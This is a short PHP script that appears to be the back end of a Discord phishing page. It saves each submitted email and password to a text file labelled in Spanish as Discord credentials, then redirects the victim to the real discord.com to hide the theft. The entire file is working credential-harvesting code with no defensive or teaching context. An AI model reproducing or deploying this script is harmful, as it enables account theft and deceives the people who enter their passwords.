<?php 
file_put_contents("usuarios.txt", "Usuario de Discord: " . $_POST['email'] . " Contraseña: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://discord.com');
exit();
?>
